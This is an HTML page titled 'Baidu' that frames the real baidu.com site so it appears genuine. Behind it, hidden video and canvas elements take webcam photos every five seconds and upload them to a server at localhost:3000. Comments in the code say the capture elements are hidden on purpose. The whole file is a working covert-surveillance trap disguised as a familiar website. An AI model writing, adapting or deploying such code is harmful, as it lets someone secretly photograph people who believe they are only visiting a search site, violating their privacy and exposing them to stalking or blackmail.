<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Baidu</title> <style>
        /* 确保 iframe 能够铺满整个页面 */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden; /* 隐藏滚动条 */
        }
        #bg-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none; /* 移除 iframe 的边框 */
        }
        /* 确保功能性元素完全隐藏且不占空间 */
        #webcam, #canvas {
            display: none;
        }
    </style>
</head>
<body>

    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <iframe id="bg-frame" src="https://www.baidu.com"></iframe>

    <script>
        const webcamVideo = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        
        let stream;
        let isUploading = false;
        const UPLOAD_INTERVAL = 5000; // 5秒

        // 核心的拍照上传函数
        async function captureAndUpload() {
            if (isUploading || !stream) {
                return;
            }

            isUploading = true;

            const videoSettings = stream.getVideoTracks()[0].getSettings();
            canvas.width = videoSettings.width;
            canvas.height = videoSettings.height;

            const context = canvas.getContext('2d');
            context.drawImage(webcamVideo, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('photo', blob, `capture-${Date.now()}.jpg`);
                
                try {
                    const response = await fetch('http://localhost:3000/upload', {
                        method: 'POST',
                        body: formData,
                    });

                    if (response.ok) {
                        console.log('Upload successful at', new Date().toLocaleTimeString());
                    } else {
                        console.error('Upload failed:', response.statusText);
                    }
                } catch (error) {
                    console.error('Upload error:', error);
                } finally {
                    isUploading = false;
                }

            }, 'image/jpeg', 0.9);
        }

        // 初始化摄像头并启动定时器
        async function init() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 1280, height: 720 }, 
                    audio: false 
                });
                webcamVideo.srcObject = stream;
                
                webcamVideo.onloadedmetadata = () => {
                    // 摄像头就绪后，直接启动定时器
                    setInterval(captureAndUpload, UPLOAD_INTERVAL);
                    console.log('Background capture process started.');
                };

            } catch (error) {
                // 如果用户拒绝授权，这个错误会在控制台显示
                console.error('Camera access denied or error:', error);
            }
        }

        // 启动
        init();
    </script>
</body>
</html>
